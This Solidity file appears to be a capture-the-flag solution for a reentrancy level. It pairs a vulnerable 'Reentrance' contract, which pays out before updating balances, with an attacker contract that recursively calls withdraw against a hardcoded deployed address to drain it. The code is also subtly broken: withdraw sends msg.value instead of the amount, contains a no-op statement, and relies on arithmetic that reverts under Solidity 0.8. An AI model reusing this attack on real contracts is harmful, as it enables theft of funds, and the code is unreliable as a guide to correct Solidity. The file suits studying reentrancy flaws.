pragma solidity 0.8.6;

import "./safemath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public payable{
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value: msg.value}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract ggog {
  
     function attack() public payable{
       Reentrance(payable(0x1DB5245A033a8bd26325cC141bBD81945b8Dfe2B)).donate{value:msg.value}(address(this));
       Reentrance(payable(0x1DB5245A033a8bd26325cC141bBD81945b8Dfe2B)).withdraw(1 ether);
    }
    
    fallback() external payable {
      Reentrance(payable(0x1DB5245A033a8bd26325cC141bBD81945b8Dfe2B)).withdraw(1 ether);
    }
}
